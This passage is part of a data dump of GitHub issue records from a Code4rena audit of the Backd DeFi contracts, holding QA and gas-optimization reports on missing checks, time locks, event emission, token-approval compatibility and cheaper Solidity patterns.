\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract5 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37087              \u2506 216             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 mulAssemblyTest    \u2506 265             \u2506 265 \u2506 265    \u2506 265 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract6 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 41893              \u2506 240             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 divTest            \u2506 325             \u2506 325 \u2506 325    \u2506 325 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract7 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 divAssemblyTest    \u2506 265             \u2506 265 \u2506 265    \u2506 265 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines  - AmmGauge.sol:111  - AmmGauge.sol:133  - AmmGauge.sol:148  - BkdLocker.sol:140  - BkdLocker.sol:326  - CvxMintAmount.sol:10  - CvxMintAmount.sol:12  - CvxMintAmount.sol:21  - CvxMintAmount.sol:30  - CvxMintAmount.sol:33  - InflationManager.sol:574  - InflationManager.sol:588  - InflationManager.sol:601  - KeeperGauge.sol:114  - LpGauge.sol:115  - Minter.sol:188  - Minter.sol:190  - Minter.sol:200  - Minter.sol:204  - Minter.sol:207  - Minter.sol:219  - Minter.sol:86  - Minter.sol:87  - Minter.sol:88  - Minter.sol:90  - VestedEscrow.sol:104  - VestedEscrow.sol:108  - VestedEscrow.sol:109  - VestedEscrow.sol:155  - VestedEscrow.sol"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/25", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: Add in the additional checks to validate if the new value being set is the same as the current value already set in the contract.   ## Missing Time locks **Severity**: Low **Context**: [`Controller.sol#L62-L76`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L62-L76)  **Description**: None of the onlyOwner functions that change critical protocol addresses/parameters appear to have a time lock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and given them a chance to perform incident response.  **Recommendation**: Add a time lock to these functions for a time-delayed change to alert users and protect against possiable malicious changes by compromised owners(s).   ## Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Controller.sol#L33-L37`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33-L37), [`StakerVault.sol#L98-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L98-L102), [`StakerVault.sol#L197-L210`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L197-L210), [`StakerVault.sol#L218-L235`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L218-L235), [`AmmGauge.sol#L49-L54`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L49-L54), [`InflationManager.sol#L58-L63`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58-L63), [`InflationManager.sol#L435-L438`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L435-L438), [`InflationManager.sol#L446-L467`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L446-L467), [`InflationManager.sol#L482-L489`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L482-L489), [`KeeperGauge.sol#L57-L62`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62), [`Minter.sol#L99-L102`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L99-L102), [`Minter.sol#L104-L108`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L104-L108), [`VestedEscrow.sol#L64-L72`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L64-L72), [`VestedEscrow.sol#L74-L78`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74-L78)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Add events to functions that change critical parameters.   ## Max/Infinite Approvals are Dangerous **Severity**: Low **Context**: [`RewardHandler.sol#L62-L65`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L62-L65)  **Description**: Giving max/infinite approvals to contracts are dangerous. Giving max/infinite approvals to contracts are dangerous because if those contracts are exploited then they can remove all the funds from the approving addresses.  Recommendation Check allowance and approve as much as required.   ## TODOs Left In The Code **Severity**: Informational **Context**: [`InflationManager.sol#L532`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L532)  **Description**: There should never be any TODOs in the code when deploying.  **Recommendation**: Finish the TODOs before deploying.   ## Spelling Errors **Severity**: Informational **Context**: [`BkdLocker.sol#L173 (invlude => include)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L173), [`FeeBurner.sol#L29 (successfull => successful)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L29 (Emmited => Emitted)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L29), [`FeeBurner.sol#L35 (Recieve => Receive)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L35), [`FeeBurner.sol#L84 (Transfering => Transferring)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L84)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Check all misspellings to ensure they are corrected.   ## Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/24", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## Catching The Array Length Prior To Loop **Context**: [`RoleManager.sol#L75-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/access/RoleManager.sol#L75-L88), [`RewardHandler.sol#L35-L55`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L35-L55), [`StakerVault.sol#L256-L263`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L256-L263), [`FeeBurner.sol#L43-L88`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/FeeBurner.sol#L43-L88), [`InflationManager.sol#L110-L125 (For L116)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L110-L125), [`VestedEscrow.sol#L89-L111`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L89-L111), [`PoolMigrationZap.sol#L20-L29`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L20-L29), [`PoolMigrationZap.sol#L38-L45`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45)  **Description**: One can save gas by caching the array length (in stack) and using that set variable in the loop. Replace state variable reads and writes within loops with local variable reads and writes. This is done by assigning state variable values to new local variables, reading and/or writing the local variables in a loop, then after the loop assigning any changed local variables to their equivalent state variables.  **Recommendation**:  Simply do something like so before the for loop: ```uint length =  variable.length```. Then add ```length``` in place of ``` variable.length``` in the for loop.    ## In `require()`, Use `!= 0` Instead of `> 0` With Uint Values **Context**: [`BkdLocker.sol#L90-L100 (For both)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L90-L100), [`BkdLocker.sol#L133-L155 (For L137)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L133-L155), [`AmmGauge.sol#L103-L116 (For L104)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103-L116), [`AmmGauge.sol#L124-L138 (For L125)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L124-L138), [`KeeperGauge.sol#L125-L144 (For L140)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol#L125-L144), [`VestedEscrow.sol#L80-L87 (For L84)`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L80-L87)  **Description**: In a require, when checking a uint, using `!= 0` instead of `> 0` saves 6 gas. This will jump over or avoid an extra `ISZERO` opcode.  **Recommendation**:  Use `!= 0` instead of `> 0` with uint values but only in `require()` statements.   ## Setting The Constructor To Payable **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: You can cut out 10 opcodes in the creation-time EVM bytecode if you declare a constructor payable. Making the constructor payable eliminates the need for an initial check of `msg.value == 0` and saves 21 gas on deployment with no security risks.  **Recommendation**:  Set the constructor to payable.   ## Function Ordering via Method ID **Context**: [`All Contracts`](https://github.com/code-423n4/2022-05-backd)  **Description**: Contracts most called functions could simply save gas by function ordering via Method ID. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because 22 gas are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. One could use [`This tool`](https://emn178.github.io/solidity-optimize-name/) to help find alternative function names with lower Method IDs while keeping the original name intact.  **Recommendation**:  Find a lower method ID name for the most called functions for example ```mostCalled()``` vs. ```mostCalled_41q()``` is cheaper by 44 gas."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/22", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "### Redundant checks can be removed  **Details**: The checks on [L575](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L575), [L589](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L589) and [L602](https://github.com/code-423n4/2022-05-backd/blob/1136e0cdc8579614a33832fe2a21785d60aac19b/protocol/contracts/tokenomics/InflationManager.sol#L602) of CrvDepositor.sol can be removed since the variables `totalKeeperPoolWeight`, `totalLpPoolWeight` and `totalAmmTokenWeight` are `uint256` and the unchecked versions of add and sub are not used before these lines.   ### Some if conditions can be simplified changing \u2264 to ==  **Details**: Some variables in the contract are of the type `uint256` and will never be strictly negative. Thus, to check if these variables are not strictly positive you only need to check if they are equal to 0 \u2014 this will economize gas because EVM instruction set does not have an opcode for the condition \"less than or eq\", only for \"less than\" and \"equal\" opcodes.   In view of this it is suggested to perform the following simplifications:  - Since `amount` in [L62](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L62) of AmmGauge.sol is `uint256`, the if condition at [L63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L63) can be simplified to          ```solidity     if (amount == 0) return 0;     ```      - Since the variables `amount`, `crvAmount` and `crxAmount` in [L70-72](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L70-L72) of AmmConvexGauge.sol are `uint256`, the if condition at [L73](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L73) can be simplified to          ```solidity     if (amount == 0 && crvAmount == 0 && cvxAmount == 0) return 0;     ```      - Since the variable `amount` in [L58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L58) of LpGauge.sol is `uint256`, the if condition at [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59) can be simplified to          ```solidity     if (amount == 0) return 0;     ```       ### Pre-incrementing a variable is cheaper than post-incrementing it  **Details**: Consider changing [L59](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59) and [L98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98) of KeeperGauge.sol to `++epoch;`. For more information, see [G012](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g012---use-prefix-increment-instead-of-postfix-increment-if-possible) of c4-common-issues.  ### Unused library  **Details**: `ScaledMath` is added to `uint256` in BkdToken.sol, but its functions are not used. Consider removing it."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# `Approve` not compatible with Tether (USDT) implementation  Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT or CVX)'s `approve()` function will revert if the current approval is not zero, to protect against front-running changes of approvals.  ```javascript function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {       // To change the approve amount you first have to reduce the addresses`      //  allowance to zero by calling `approve(_spender, 0)` if it is not      //  already 0 to mitigate the race condition described here:      //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729      require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));       allowed[msg.sender][_spender] = _value;      Approval(msg.sender, _spender, _value);  } ```  The code as currently implemented does not handle these sorts of tokens properly, which would prevent USDT or CVX, from being used by this project.  If the method [allPools](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L21) return pools with duplicate underlyings, it will fault in the case of USDT or CVX, for example.  Affected source code:  - [PoolMigrationZap.sol#L27](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L27)  # Lack of checks  The following methods have a lack checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  Affected source code:  - [RoleManager.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L32) - [Authorization.sol#L10](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/Authorization.sol#L10) - [RoleManager.sol#L151](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L151) - [RoleManager.sol#L157](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/access/RoleManager.sol#L157) - [StakerVault.sol#L71](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L71) - [BkdLocker.sol#L49-L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L49-L50) - [AddressProvider.sol#L50](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L50) - [AddressProvider.sol#L56](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L56) - [AddressProvider.sol#L65](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L65) - [AddressProvider.sol#L70](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L70) - [AddressProvider.sol#L81](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/AddressProvider.sol#L81) - [BkdToken.sol#L21](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/BkdToken.sol#L21) - [FeeBurner.sol#L32](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/FeeBurner.sol#L32) - [VestedEscrowRevocable.sol#L43](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L43) - [KeeperGauge.sol#L48](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L48) - [VestedEscrow.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L52) - 